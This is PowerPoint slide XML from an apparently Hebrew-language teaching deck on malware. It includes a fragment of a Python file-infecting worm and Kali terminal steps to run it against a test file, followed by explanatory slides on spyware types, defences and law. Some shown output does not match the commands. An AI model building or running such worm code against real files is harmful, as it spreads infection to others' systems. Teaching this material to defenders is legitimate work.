          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1"/>
              <a:t>files_to_infect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1"/>
              <a:t>find_files_to_infect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1"/>
              <a:t>start_path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t># </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="3200" dirty="0"/>
              <a:t>הדבקת הקבצים שנמצאו</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1"/>
              <a:t>infect_files</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1"/>
              <a:t>files_to_infect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1"/>
              <a:t>worm_code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t>print(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1"/>
              <a:t>f"Infected</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1"/>
              <a:t>len</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1"/>
              <a:t>files_to_infect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t>)} files.")</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8141283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3B38D5D-FFB6-4037-A671-649F63BCAA69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="556591" y="642594"/>
            <a:ext cx="11777870" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="4000" dirty="0"/>
              <a:t>המשך – שלבים בסיסיים ליצירת תולעת (הלכה למעשה)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{103E1C9A-104A-4165-B0B0-6F1A3E4EF58B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2103119"/>
            <a:ext cx="10058400" cy="4426889"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אח"כ נפתח את הטרמינל </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="it-IT" dirty="0"/>
              <a:t>nano /home/kali/Documents/worm.py</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ושם נכתוב את הקוד הנ"ל.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לאחר מכן אנו ניצור קובץ חדש:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>echo "This is a worm!." &gt; /home/kali/Documents/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>test_file.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ועכשיו נריץ את הקוד שכתבנו ע"י הפקודה הבאה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>python3 /home/kali/Documents/worm.py</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ואז נבדוק את הקובץ שלנו ע"י הפקודה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>cat /home/kali/Documents/test_file.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ונקבל פלט במידה והתולעת בפנים והוא:,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>"This is a test file.</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This is a worm!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>'You have been infected</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1561774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C5A57B08-921C-4656-976E-34AA92A27DAB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2361537"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="8000" dirty="0"/>
              <a:t>תוכנת ריגול</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8511106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5EAAD9E-1DC3-4A90-BF3B-75B8895E97A1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="642594"/>
            <a:ext cx="5029200" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה תוכנת ריגול?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{80AADF60-896B-4D1E-B0BD-DA061ED88918}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2500686"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תוכנת ריגול</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> היא תוכנה שמותקנת במחשב או במכשיר אחר במטרה לאסוף מידע אישי או עסקי מבלי שיתקבל אישור מהמשתמש. זה כולל מידע כמו מכתבי דוא"ל, פרטי כרטיסי אשראי, מיקומים גיאוגרפיים, והיסטוריית גלישה באינטרנט.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30905114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EBFAA7A-C331-415C-B5A4-396A51179ED3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4671390" y="642594"/>
            <a:ext cx="6453809" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כיצד פועלות תוכנות ריגול</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12D68D74-D684-49EB-B845-90347C5C593D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקנה סמויה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תוכנות ריגול לרוב מתקינות את עצמן בצורה חמקנית, לעיתים דרך קבצים מצורפים לדוא"ל, תוכנות חינמיות, או אתרים לא בטוחים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>אסיפת מידע</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: לאחר ההתקנה, התוכנה אוספת מידע מהמשתמש, כגון הקשות מקלדת, מסמכים, או נתוני גלישה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שידור מידע</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: המידע שנאסף נשלח לשרתים שמנוהלים על ידי התוקף, לעיתים באמצעות חיבורי אינטרנט מוצפנים או פתוחים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36628158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976157B-3398-4A74-A951-F762E9D2DFD1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5536096" y="642594"/>
            <a:ext cx="5589104" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוגים של תוכנות ריגול</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D86FE2C3-98B6-499C-9903-FEADFFD4020B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Keyloggers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תוכנות שמנטרות ומקליטות את הקשות המקלדת של המשתמש, כולל סיסמאות ומידע רגיש אחר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Data Stealers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תוכנות שגנבות פרטי מידע כגון פרטי כרטיסי אשראי, מכתבי דוא"ל, וסיסמאות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Adware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוכנות שמציפות את המשתמש בפרסומות מטרידות או לא רצויות, שיכולות גם לגרום לבעיות פרטיות.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33329019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14972A-8397-446D-B4B2-495DEEA13905}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="556591" y="642594"/>
            <a:ext cx="10952922" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כיצד תוכנות ריגול נבדלות מתוכנות זדוניות אחרות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{83E87817-A389-40DD-B480-6F956204977C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הבדלים מהווירוסים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: בעוד שווירוסים לרוב מתפשטים ממחשב למחשב וגורמים להרס, תוכנות ריגול נוטות להתרכז באיסוף מידע מבלי להפריע לפעולה השוטפת של המחשב.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הבדלים מהתוכנות הזדוניות האחרות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תוכנות ריגול ממוקדות בעיקר באיסוף מידע אישי, בעוד שתוכנות כופר, לדוגמה, נועדות לחסום גישה למידע עד לשחרור כופר.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28324518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C7A407-5E43-45F6-9F9F-65E3411C0A9F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3478696" y="642594"/>
            <a:ext cx="7646504" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אמצעי הגנה מפני תוכנות ריגול</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E1834548-A512-48BB-9A33-379F0BC22E71}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תוכנות אנטי-וירוס ואנטי-ריגול</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שימוש בתוכנות אבטחה מעודכנות שמיועדות לזהות ולהסיר תוכנות ריגול.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>עדכוני מערכת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שמירה על מערכת ההפעלה והיישומים מעודכנים כדי למנוע ניצול של פרצות אבטחה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הימנעות מהורדות לא בטוחות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הימנעות מהורדת תוכנות ממקורות לא מהימנים והימנעות מהקליקים על קישורים או קבצים מצורפים לא מוכרים.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20210933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54465B-82AE-4624-8C58-807E819DBAD6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7046842" y="642594"/>
            <a:ext cx="4078357" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>חוקיות ורגולציה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3B137805-5F15-48F4-8D5B-E16EE0ABE21F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>חוקיות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: במדינות רבות, התקנה או שימוש בתוכנות ריגול ללא הסכמת המשתמש נחשב לא חוקי. חוקים כמו ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GDPR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> באירופה ו-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> CAN-SPAM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בארצות הברית מכתיבים הגבלות מחמירות על איסוף ושימוש במידע אישי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>רגולציה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: חברות רבות נדרשות לעמוד בתקן ובתקנות אבטחה כדי להגן על המידע האישי של לקוחותיהם. תקנות אלו כוללות דרישות לגבי כיצד לאסוף, לאחסן ולשמור על מידע רגיש.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11846827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3C0C14B-309F-4E91-8126-65FA6A02A985}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7076660" y="642594"/>
            <a:ext cx="4048539" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תסריטי התקפה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{81295F39-1651-41A4-9ABF-0BF299111532}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מתקפות על עסקים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תוקפים יכולים להשתמש בתוכנות ריגול כדי לגנוב מידע עסקי רגיש, כגון רשימות לקוחות, דוחות פיננסיים, ותכניות עסקיות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מתקפות על פרטים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
